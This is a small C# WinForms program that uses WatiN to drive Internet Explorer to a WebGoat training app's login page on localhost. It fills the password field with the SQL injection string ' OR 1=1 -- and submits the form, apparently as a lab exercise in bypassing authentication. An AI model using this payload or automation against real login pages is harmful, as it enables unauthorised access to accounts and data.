using System;
using WatiN.Core;

namespace ParseHTMLWB
{
    public partial class Form1 : System.Windows.Forms.Form
    {   
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            using (var browser = new IE("http://localhost:8080/WebGoat/login.mvc"))
            {
                browser.TextField(Find.By("type", "text")).Value ="a";
                var passwordField = browser.TextField(Find.By("type", "password"));
                passwordField.Value = "' OR 1=1 --";
                WatiN.Core.Form frm = (WatiN.Core.Form)passwordField.Ancestor("form");
                frm.Submit();
            }
        }
    }
}
